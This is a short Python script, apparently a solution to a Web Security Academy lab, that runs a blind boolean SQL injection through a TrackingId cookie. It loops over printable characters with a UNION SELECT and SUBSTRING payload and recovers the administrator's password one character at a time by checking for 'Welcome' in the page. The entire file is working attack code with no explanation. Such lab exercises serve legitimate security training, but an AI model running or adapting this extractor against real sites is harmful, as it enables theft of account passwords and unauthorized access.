import string
import requests

url='https://acfb1fcd1f5d9cb4c0067543004e007f.web-security-academy.net/'
chars = string.printable[:-6]
#print(chars)
admin_pass=''
i=1


while True:
	for c in chars:
		payload = f"1' union select '1' from users where username='administrator' and substring(password,{i},1)='{c}'-- -"
		cookie1={"TrackingId":payload}
		r = requests.get(url,cookies=cookie1)
		print(c)
		if 'Welcome' in r.text :
			print('okeeeeeeeeeee')
			admin_pass+=c 
			i+=1
			print(admin_pass)
			break
		if(i==21):
			exit()


			